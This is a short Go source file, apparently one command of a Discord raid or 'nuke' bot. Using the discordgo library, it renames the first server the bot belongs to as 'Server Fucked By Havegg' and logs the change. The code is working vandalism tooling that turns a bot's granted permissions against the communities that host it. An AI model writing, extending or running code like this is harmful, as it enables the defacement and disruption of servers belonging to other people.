package commands

import (
	"fmt"

	"github.com/bwmarrin/discordgo"
)

func ChangeName(s *discordgo.Session) {
	if len(s.State.Guilds) == 0 {
		fmt.Println("❌ The bot is not located in any server.")
		return
	}

	guildID := s.State.Guilds[0].ID
	newName := "Server Fucked By Havegg"

	_, err := s.GuildEdit(guildID, &discordgo.GuildParams{
		Name: newName,
	})
	if err != nil {
		fmt.Println("Error changing name:", err)
		return
	}

	fmt.Println("Server name changed to:", newName)
}
